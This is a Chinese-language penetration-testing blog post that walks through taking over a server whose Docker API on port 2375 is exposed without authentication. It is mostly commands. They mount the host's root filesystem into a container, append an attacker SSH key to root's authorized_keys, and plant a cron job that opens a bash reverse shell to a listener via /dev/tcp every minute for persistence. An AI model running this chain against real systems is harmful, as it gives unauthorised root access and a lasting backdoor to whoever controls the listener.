---
title: 'Docker未授权致RCE'
date: 2025-01-22T23:20:26+08:00
lastmod: 2025-01-22T23:20:26+08:00
draft: false
slug: c767958d
tags: ["内网渗透"]
---

- 参考谢公子：[Site Unreachable](https://cloud.tencent.com/developer/article/2321247)
- 在实战中遇到了记一下，最终可以直接 ssh 登录 + 反弹 shell 到内网其他主机

## 测试过程
### docker 未授权

nmap 扫描发现 2375 端口开放 docker 服务，测试以下 URL 发现 docker 未授权：

```
http://x.x.x.x:2375/version
http://x.x.x.x:2375/images
http://x.x.x.x:2375/info
```

### docker 远程命令

可以在本地使用命令远程管理 docker：

```bash
docker -H tcp://<IP>:2375 images -a
docker -H tcp://<IP>:2375 ps
docker -H tcp://<IP>:2375 exec -it e7d97caf249d /bin/bash
```

### 获取宿主机权限

容器里面操作没啥意义，关键是要获取宿主机（目标服务器）的权限。

启动一个未开启的容器，然后将**宿主机的磁盘挂载到容器中**：

```bash
docker -H tcp://<IP>:2375 run -it -v /:/opt b76f96a98a27 /bin/bash
```

- `-v /:/opt`：-v 选项的作用是选择挂载卷，此处将宿主机的整个文件系统 `/` 挂载到容器内的 `/opt` 目录下。

**因此，我们可以通过容器内 `/opt` 目录，管理宿主机文件系统。**

### 写入SSH公钥

管理文件系统并不算真正获取权限，但是也快了。

先在本地生成一对 SSH 的公私钥对，然后直接 echo 把 SSH 公钥写入服务器的公钥文件：

```bash
# 本地生成公私钥对
ssh-keygen -t rsa -b 2048 -f ~/.ssh/id_rsa
# 默认保存在 ~/.ssh , 私钥是 id_rsa , 公钥是 id_rsa.pub

# 修改服务器文件：进入docker容器挂的宿主机文件系统
cd /opt/root/.ssh/
# echo 写入公钥（id_rsa.pub的内容）
echo "ssh-rsa jdiofjsdoijfosjdsjfosdjfo..." >> authorized_keys
```

- 没有.ssh目录或者 authorized_keys 文件就自己创建一个

服务器写入公钥之后，本地可以直接通过**指定私钥文件**来登录服务器：

```bash
ssh -i ~/.ssh/id_rsa root@<IP>
```

### 持久化

最后做一步权限维持，给宿主机设置**定时任务**。

将反弹 shell 的命令写入 `/var/spool/cron/root` 文件中：
- 也可能是 `/var/spool/cron/crontab/root`

```bash
cd /opt/var/spool/cron
echo "*/1  *  *  *  *   /bin/bash -i>&/dev/tcp/<IPonListening>/4444 0>&1" >> root
```

- 含义是每隔一分钟，反弹一次 shell

假如服务器默认 shell 是 zsh，需要把反弹 shell 命令改成：

```bash
echo "*/1  *  *  *  *   bash -c 'bash -i >& /dev/tcp/<IPonListening>/10341 0>&1'" >> root
```

注意，目标服务器可能出不了网，只能反弹 shell 到内网，需要有一台内网机器，可以之后再由内网机器配置转发到外网。